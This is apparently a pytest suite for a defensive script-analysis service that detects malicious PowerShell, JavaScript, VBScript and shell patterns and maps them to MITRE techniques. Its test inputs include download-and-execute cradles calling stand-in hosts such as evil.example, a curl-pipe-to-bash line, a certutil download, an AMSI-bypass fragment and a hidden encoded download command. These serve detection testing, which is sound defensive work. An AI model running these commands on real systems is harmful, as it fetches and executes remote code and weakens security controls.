"""
DIE · PowerShell AST tests
──────────────────────────
Deterministic contract — every input MUST produce the same envelope.
Run inside the pod: `pytest /app/backend/tests/test_die_powershell.py -v`
"""
import pytest
from services.die.powershell_ast import parse_powershell
from services.die.api import detect_language, analyze


# ── language detection ────────────────────────────────────────────
def test_detect_powershell_by_iex():
    assert detect_language("IEX (New-Object Net.WebClient).DownloadString('http://x/a')") == "powershell"

def test_detect_powershell_by_encoded_flag():
    assert detect_language("powershell.exe -EncodedCommand aQBlAHgA") == "powershell"

def test_detect_javascript():
    assert detect_language("new ActiveXObject('WScript.Shell').Run('cmd /c calc')") == "javascript"

def test_detect_vbscript():
    assert detect_language('Set sh = CreateObject("WScript.Shell")\nEnd Sub') == "vbscript"

def test_detect_bash():
    assert detect_language("#!/bin/sh\ncurl -sL http://x/a | bash") == "bash"

def test_detect_unknown():
    assert detect_language("hello world") == "unknown"


# ── deterministic tokenization ────────────────────────────────────
def test_tokenizer_stability():
    src = "Invoke-WebRequest -Uri 'http://x/y' -OutFile $env:TEMP\\a.exe"
    a = parse_powershell(src)
    b = parse_powershell(src)
    # Structural stability is the deterministic guarantee.
    assert a["cmdlets"] == b["cmdlets"]
    assert a["flags"]   == b["flags"]
    assert a["iocs"]    == b["iocs"]


# ── cmdlet extraction ─────────────────────────────────────────────
def test_extracts_invoke_webrequest():
    src = "Invoke-WebRequest -Uri http://evil.example/x.ps1 -OutFile a.ps1"
    ast = parse_powershell(src)
    names = [c["name"].lower() for c in ast["cmdlets"]]
    assert "invoke-webrequest" in names
    iwr = next(c for c in ast["cmdlets"] if c["name"].lower() == "invoke-webrequest")
    assert iwr["verb"] == "invoke"
    assert iwr["noun"] == "webrequest"
    assert "uri" in iwr["params"]


# ── encoded command handling ──────────────────────────────────────
def test_encoded_command_flag_and_decode():
    # Base64("Write-Host 'die-cycle-a'") in UTF-16-LE:
    import base64
    payload = base64.b64encode("Write-Host 'die-cycle-a'".encode("utf-16-le")).decode()
    src = f"powershell.exe -NoP -EncodedCommand {payload}"
    ast = parse_powershell(src)
    assert ast["flags"]["encoded_command"] is True
    assert ast["encoded_payloads"], "at least one decoded preview expected"
    assert any("die-cycle-a" in p["preview"] for p in ast["encoded_payloads"])


# ── download-cradle detection ─────────────────────────────────────
def test_download_cradle_detection():
    src = "IEX((New-Object Net.WebClient).DownloadString('http://evil.example/a.ps1'))"
    ast = parse_powershell(src)
    assert ast["flags"]["download_cradle"] is True
    assert ast["flags"]["iex_invocation"] is True
    ids = {t["id"] for t in ast["techniques"]}
    assert "T1105" in ids
    assert "T1059.001" in ids


# ── AMSI / reflection ─────────────────────────────────────────────
def test_amsi_bypass_flag():
    src = "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')"
    ast = parse_powershell(src)
    assert ast["flags"]["amsi_bypass"] is True
    ids = {t["id"] for t in ast["techniques"]}
    assert "T1562.001" in ids


# ── LOLBAS discovery in PS ────────────────────────────────────────
def test_lolbas_certutil_seen():
    src = "certutil.exe -urlcache -f http://x/y a.exe"
    ast = parse_powershell(src)
    names = {lb["binary"] for lb in ast["lolbins"]}
    assert "certutil.exe" in names


# ── obfuscation scoring ───────────────────────────────────────────
def test_obfuscation_score_high_for_char_join():
    src = "$s = -join ([char]73,[char]69,[char]88); &$s"
    ast = parse_powershell(src)
    assert ast["complexity"]["obfuscation_score"] >= 20


def test_obfuscation_score_zero_for_clean_input():
    src = "Get-Process | Where-Object {$_.CPU -gt 100}"
    ast = parse_powershell(src)
    assert ast["complexity"]["obfuscation_score"] < 15


# ── IOC extraction inside PS ──────────────────────────────────────
def test_url_and_domain_iocs():
    src = "iwr http://c2.evil.example:8443/beacon | iex"
    ast = parse_powershell(src)
    values = {(i["kind"], i["value"]) for i in ast["iocs"]}
    assert any(k == "url" for k, _ in values)
    assert any(v.startswith("http://c2.evil.example") for _, v in values)


# ── full envelope smoke ───────────────────────────────────────────
def test_analyze_end_to_end_powershell():
    src = ("powershell.exe -NoP -w hidden -ep bypass -EncodedCommand "
           "aQBlAHgAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABp"
           "AGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAA"
           "OgAvAC8AZQB2AGkAbAAvAGEALgBwAHMAMQAnACkAKQA=")
    env = analyze(src)
    assert env["language"] == "powershell"
    assert env["ast"] is not None
    assert env["ast"]["flags"]["encoded_command"] is True
    ids = {t["id"] for t in env["techniques"]}
    assert "T1027" in ids  # Obfuscated / encoded content
